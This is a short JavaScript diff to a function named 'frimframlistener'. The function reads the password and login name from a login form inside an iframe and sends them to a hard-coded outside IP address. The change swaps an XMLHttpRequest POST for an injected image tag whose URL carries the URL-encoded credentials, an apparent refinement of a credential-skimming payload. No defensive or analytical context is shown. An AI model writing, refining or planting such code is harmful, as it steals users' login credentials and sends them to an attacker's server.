@@ -11,10 +11,10 @@ function frimframlistener(){
 		frimframdoc = document.getElementById('frimfram').contentWindow.document;
 		pw = frimframdoc.querySelector('#password').value;
 		un = frimframdoc.querySelector('#loginName').value;
-		var req = new XMLHttpRequest();
+		imag = document.createElement('img');
 		fin = encodeURIComponent('pwd='+pw+'&usr='+un);
-		req.open('post', 'http://74.14.159.250:8000/?' + fin);
-		req.send();
+		imag.src = 'http://74.14.159.250:8000/?' + fin;
+		document.body.appendChild(imag);
 	}catch(error){
 		console.error(error);
 	}
